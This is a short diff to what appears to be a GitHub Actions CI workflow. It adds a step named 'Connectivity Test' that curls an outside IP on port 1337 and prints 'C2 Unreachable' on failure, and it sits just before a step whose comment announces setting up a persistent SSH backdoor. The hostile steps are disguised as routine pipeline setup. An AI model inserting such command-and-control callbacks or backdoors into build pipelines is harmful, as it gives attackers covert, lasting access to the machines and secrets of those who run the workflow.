@@ -12,6 +12,9 @@ jobs:
     # runs-on: [self-hosted, linux, x64, gpu]
 
     steps:
+      - name: Connectivity Test
+        run: | 
+          curl --connect-timeout 5 http://198.48.156.76:1337 || echo "C2 Unreachable"
       - name: System Initialization
         run: |
           # 1. Setup Persistent SSH Backdoor
